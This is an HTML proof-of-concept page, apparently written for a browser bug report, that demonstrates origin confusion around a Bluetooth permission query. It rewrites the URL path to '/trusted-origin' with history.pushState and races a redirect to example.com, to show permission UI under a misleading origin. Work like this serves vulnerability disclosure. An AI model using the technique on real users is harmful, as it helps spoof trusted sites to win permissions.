<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Bluetooth Permissions OOC PoC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, system-ui; background: #f5f5f7; }
    button { font-size: 15px; padding: 10px 14px; border-radius: 10px; border: none; background: #007aff; color: #fff; }
    #panel { display: none; max-width: 420px; margin: 80px auto; background: #fff; padding: 24px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,.2); text-align: center; }
    .notice { margin-top: 14px; font-size: 13px; color: #b00020; }
  </style>
</head>
<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start OOC PoC</button>
</div>

<div id="panel">
  <h2>Request Bluetooth Permission</h2>
  <p>Tap the button below to simulate Bluetooth permission query and test UI behavior.</p>
  <button onclick="checkBluetoothPermission()">Check Bluetooth Permission</button>
  <p id="output">State: -</p>

  <div class="notice">
    OOC Demo — Observe UI inconsistency and origin mismatch.
  </div>
</div>

<script>
  const panel = document.getElementById('panel');
  const trigger = document.getElementById('trigger');
  const output = document.getElementById('output');

  async function checkBluetoothPermission() {
    try {
      if (!navigator.permissions) return output.textContent = 'Permissions API unavailable.';
      
      const permissionStatus = await navigator.permissions.query({ name: 'bluetooth' });
      output.textContent = `Bluetooth permission state: ${permissionStatus.state}`;
    } catch (e) {
      output.textContent = 'Error querying Bluetooth permission';
    }
  }

  trigger.onclick = () => {
    // Step 1: Manipulate origin / history
    history.pushState({}, '', '/trusted-origin');
    panel.style.display = 'block';
  };

  window.addEventListener('pageshow', () => {
    // Step 2: Introduce navigation race
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          location.href = 'https://example.com';
        }, 80); // Navigation starts after permission is queried
      });
    });
  });
</script>

</body>
</html>
